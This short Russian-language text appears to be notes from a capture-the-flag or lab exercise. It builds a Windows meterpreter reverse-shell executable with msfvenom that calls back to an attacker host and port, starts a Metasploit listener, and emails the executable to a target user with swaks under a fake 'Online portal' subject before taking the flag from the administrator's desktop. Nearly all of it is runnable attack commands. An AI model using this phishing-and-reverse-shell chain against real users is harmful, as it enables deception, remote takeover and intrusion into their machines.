создаем екзешник 
```
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=100.100.2.252 LPORT=5566 -f exe -o unl.exe 
```
Запускаем слушатель exploit\multi\handler

Отправляем файл пользователю
```
swaks --h-From: "Site" --from "kali@kali.com" --to james@knight.com -tlso --header "Subject: Онлайн портал  " --body "Здравствуйте" --attach @unl.exe -s 10.10.0.6:587

```
забираем флаг с рабочего стола администратора
